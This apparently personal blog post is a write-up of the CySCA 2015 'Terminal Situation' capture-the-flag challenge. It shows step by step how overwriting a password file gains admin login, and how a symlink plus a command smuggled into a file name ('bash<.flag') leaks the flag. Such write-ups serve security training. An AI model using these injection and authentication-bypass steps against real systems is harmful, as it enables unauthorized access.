---
title: CySCA 2015 - Web Application Pentest 6 - Terminal Situation
author: nickw
layout: post

categories:
  - Blog
  - Security
---


<div style="font-size:0.7em"><i>Note: If you're interested in actually doing these challenges, <a href="/post/2015/cysca-2015/">check out this post</a> on 
how to get the environment set up.</i>
</div>

* * *

It's no coincidence this challenge is called Terminal Situation, we have a 
terminal sitting right in front of us. 

<!--break-->

{% highlight text %}
<server> connected
{% endhighlight %}

Lets type `help` to see if it will give us a prompt.

{% highlight text %}
> help
AVAILABLE COMMANDS:
help                  display this information
id                    show user id
ps                    list active processes
ip                    list network interfaces
rm                    delete file
ln <src> <dst>        create symlink (admins only)
ls                    list directory entries
  -s                  view file size information
  -h                  view hidden files
uname                 show system information
auth <password>       authenticate as administrator
log <outfile>         append next command output to file
reset                 reset to initial terminal state
{% endhighlight %}

We notice a command `auth` which takes a password to authenticate as an 
administrator. We also notice that using `ln` is a privileged command, 
which indicated we need to become an administrator.

Performing an "ls -h", showing hidden files, reveals

{% highlight text %}
> ls -h
.
..
.flag
.passwd
bin
{% endhighlight %}

The password for the authentication is going to be stored in `.passwd`, however
we have no way of reading files. We do, however, have a method of writing and
deleting, namely `log` and `rm`. 

- `rm .passwd`: Delete the passwd file so we can re-write it
- `log .passwd`: Log the next commands output into .passwd
- `ls` : This outputs `bin` into `.passwd`
- `auth bin`: Using our new password, `bin`, we log in.

{% highlight text %}
> rm .passwd
> log .passwd
[log] next command output will be saved to .passwd
> ls
bin
> auth bin
[auth] admin login successful!
{% endhighlight %}

Okay so now we can fiddle around with the ln command. Lets take a look at 
what's in the `bin` directory. 

{% highlight text %}
> ls -s -h bin
total 40
drwxr-xr-x 2 root     ecwiterm 4096 Nov 19 05:42 .
drwxrwxr-x 3 root     ecwiterm 4096 Nov 19 08:10 ..
-rwxr-xr-x 1 root     ecwiterm   54 Nov 19 05:42 bash
-rwxr-xr-x 1 ecwiterm ecwiterm    3 Nov 19 05:42 id.sh
-rwxr-xr-x 1 root     ecwiterm   52 Nov 19 05:42 ip
-rwxr-xr-x 1 root     ecwiterm   53 Nov 19 05:42 ln
-rwxr-xr-x 1 root     ecwiterm   58 Nov 19 05:42 ls
-rwxr-xr-x 1 root     ecwiterm   49 Nov 19 05:42 ps
-rwxr-xr-x 1 root     ecwiterm   55 Nov 19 05:42 rm
-rwxr-xr-x 1 root     ecwiterm   52 Nov 19 05:42 uname
{% endhighlight %}

The only file we have write access to is id.sh. Lets see if we can write 
arbitrary commands into it:

{% highlight text %}
> log bin/id.sh
log: invalid log file, can't use bin directory
{% endhighlight %}


I'm not surprised. What if we create a symbolic link to the script and try log
to it? 

{% highlight text %}
> ln bin/id.sh id.sh
> ls -s -h
total 20
drwxrwxr-x 3 root     ecwiterm 4096 Nov 19 08:14 .
drwxr-xr-x 3 root     ecwiterm 4096 Nov 19 05:42 ..
-rwxr-xr-x 1 root     ecwiterm   39 Nov 19 05:42 .flag
-rw-rw-r-- 1 ecwiterm ecwiterm    3 Nov 19 08:10 .passwd
drwxr-xr-x 2 root     ecwiterm 4096 Nov 19 05:42 bin
lrwxrwxrwx 1 ecwiterm ecwiterm    9 Nov 19 08:14 id.sh -> bin/id.sh
{% endhighlight %}

Perfect. Now lets set up the command we want to run when we invoke `id`. We can 
write arbitrary commands using ls <filename> provided the file exists, so we create
the command we want:

{% highlight bash %}
> log bash<.flag
[log] next command output will be saved to bash<.flag
> ls
bin
id.sh
> ls bash*
bash<.flag
{% endhighlight %}

Our command to write will be `bash<.flag`. We now need to write this into the
script. 

{% highlight text %}
> log id.sh
[log] next command output will be saved to id.sh
> ls bash*
bash<.flag
> id
[error] uid=1002(ecwiterm) gid=1002(ecwiterm) groups=1002(ecwiterm)
bash: line 1: $'FLAG{4b000000000000000000000000000000}\r': command not found
{% endhighlight %}

And thanks to bash's useful error messages, it prints out the flag for us.

